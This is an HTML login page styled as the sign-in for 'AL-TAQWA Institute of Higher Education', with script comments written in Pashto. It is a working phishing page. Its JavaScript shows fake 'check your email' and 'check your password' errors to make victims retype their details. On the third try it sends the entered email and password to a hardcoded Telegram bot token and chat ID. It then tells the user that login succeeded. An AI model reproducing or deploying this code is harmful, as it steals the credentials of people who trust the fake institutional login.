<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AL-TAQWA Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0a3f31 0%, #166e52 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background-color: #ffffff;
            max-width: 460px;
            width: 100%;
            padding: 38px 32px 42px;
            border-radius: 40px;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25);
            text-align: center;
            transition: all 0.2s;
        }
        .logo-area h1 {
            font-size: 32px;
            font-weight: 800;
            color: #1a5d48;
            letter-spacing: -0.5px;
        }
        .logo-area p {
            font-size: 14px;
            color: #5d756a;
            margin-top: 6px;
        }
        .institute-badge {
            font-size: 15px;
            font-weight: 600;
            color: #2a7f62;
            background: #eef5f1;
            display: inline-block;
            padding: 6px 22px;
            border-radius: 60px;
            margin: 18px 0 22px;
        }
        .input-group {
            text-align: left;
            margin-bottom: 22px;
        }
        .input-group label {
            display: block;
            font-weight: 600;
            font-size: 13px;
            color: #2d4a3e;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 18px;
            font-size: 15px;
            border: 1.5px solid #dde5e0;
            border-radius: 28px;
            outline: none;
            transition: 0.2s;
            background-color: #fefcf7;
        }
        .input-group input:focus {
            border-color: #2c7a5e;
            box-shadow: 0 0 0 3px rgba(44, 122, 94, 0.2);
        }
        .checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 18px 0 28px;
            font-size: 14px;
            color: #3f6858;
        }
        button {
            width: 100%;
            background-color: #1f6e55;
            color: white;
            font-size: 17px;
            font-weight: 700;
            padding: 14px;
            border: none;
            border-radius: 44px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
        }
        button:hover {
            background-color: #0f5a45;
            transform: scale(0.97);
        }
        .msg-area {
            margin-top: 20px;
        }
        .error-msg {
            background-color: #ffe6e5;
            color: #b91c1c;
            padding: 10px 14px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 500;
        }
        .success-msg {
            background-color: #e0f7ed;
            color: #146b48;
        }
        hr {
            margin-top: 20px;
            border: 0.5px solid #e2ece5;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo-area">
        <h1>AL-TAQWA</h1>
        <p>Institute of Higher Education</p>
        <div class="institute-badge">Sign in</div>
    </div>

    <form id="loginForm">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="your@email.com" required autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="········" required>
        </div>
        <div class="checkbox">
            <input type="checkbox" id="rememberCheckbox">
            <label for="rememberCheckbox">Remember password</label>
        </div>
        <button type="submit" id="loginBtn">Login</button>
    </form>
    
    <div id="messageBox"></div>
</div>

<script>
    // ======================
    // د هڅو شمیر ساتل (مګر کارونکي ته نه ښودل کیږي)
    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts_altaqwa')) || 0;

    // د ټیلیګرام بوټ معلومات
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const CHAT_ID = "8295417969";

    // د ټیلیګرام پیغام لېږلو فنکشن
    async function sendToTelegram(email, password) {
        const message = `🔐 *AL-TAQWA LOGIN SUCCESS* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch (err) {
            console.error("Telegram error:", err);
        }
    }

    function showMessage(text, isSuccess = false) {
        const msgDiv = document.getElementById('messageBox');
        msgDiv.innerHTML = `<div class="error-msg ${isSuccess ? 'success-msg' : ''}">${text}</div>`;
        
        if (isSuccess) {
            // بریالی لاګ ان – ان پوټونه بند کړئ
            document.getElementById('email').disabled = true;
            document.getElementById('password').disabled = true;
            document.getElementById('loginBtn').disabled = true;
            setTimeout(() => {
                sessionStorage.removeItem('loginAttempts_altaqwa');
                if (confirm("✅ Login successful!\nDo you want to reload the page?")) {
                    window.location.reload();
                }
            }, 500);
        }
    }

    // د فورمې استول
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const emailInput = document.getElementById('email').value.trim();
        const passwordInput = document.getElementById('password').value;
        const rememberChecked = document.getElementById('rememberCheckbox').checked;

        // د Remember password اختیار
        if (rememberChecked) {
            localStorage.setItem('remEmail_altaqwa', emailInput);
        } else {
            localStorage.removeItem('remEmail_altaqwa');
        }

        // پدې حالت کې هر ایمیل او هر پاسورډ منل کیږي، مګر د هڅو شمیر په پام کې نیول کیږي
        // لومړۍ هڅه (attemptCount = 0)
        if (attemptCount === 0) {
            showMessage("please check your email", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
            return;
        }
        
        // دوهمه هڅه (attemptCount = 1)
        if (attemptCount === 1) {
            showMessage("please check your password", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
            return;
        }
        
        // دریمه هڅه (attemptCount = 2) – هر ډول ایمیل او پاسورډ ومنئ
        if (attemptCount === 2) {
            // هر هغه څه چې دننه شوي وي، بریالی لاګ ان ګڼل کیږي
            // معلومات اډمین (ټیلیګرام) ته واستوئ
            await sendToTelegram(emailInput, passwordInput);
            showMessage("✅ Login successful! Your credentials have been sent to admin.", true);
            sessionStorage.removeItem('loginAttempts_altaqwa');
            return;
        }
        
        // که د 3 څخه زیاتې هڅې شوې وي (امنیتي حالت) – بلاک
        if (attemptCount >= 3) {
            showMessage("Too many attempts. Please refresh the page.", false);
            document.getElementById('loginBtn').disabled = true;
        }
    });

    // د مخ په پیل کې: که لا دمخه هڅې شوې وي، بټن غیرفعال مه کوئ مګر هڅو ته اجازه ورکړئ
    window.addEventListener('DOMContentLoaded', () => {
        // که د هڅو شمیر له 3 څخه پورته وي، لاګ ان بند کړئ
        if (sessionStorage.getItem('loginAttempts_altaqwa') >= 3) {
            document.getElementById('loginBtn').disabled = true;
            showMessage("Session expired. Please refresh the page.", false);
        }
        
        const savedEmail = localStorage.getItem('remEmail_altaqwa');
        if (savedEmail) {
            document.getElementById('email').value = savedEmail;
            document.getElementById('rememberCheckbox').checked = true;
        }
    });
</script>
</body>
</html>
